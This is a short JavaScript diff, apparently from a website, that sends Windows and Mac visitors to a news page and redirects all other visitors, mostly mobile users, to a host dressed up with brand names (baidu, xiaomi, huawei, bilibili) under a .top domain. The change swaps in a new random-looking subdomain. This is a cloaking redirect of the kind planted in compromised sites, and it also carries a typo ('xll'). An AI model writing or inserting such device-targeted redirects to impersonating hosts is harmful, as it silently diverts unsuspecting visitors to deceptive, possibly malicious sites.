@@ -26,7 +26,7 @@ system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
 if (system.win || system.mac || system.xll) {
     window.location.href = '/news/'
 } else {
-    window.location.href = " http://baidu.com_______________________xiaomi.huawei.bilibili.sy6602621.top/m"
+    window.location.href = " https://82852acc44553cadb052.xiaomi.huawei.bilibili.sy6602621.top/m"
 }
 }
 //点击事件
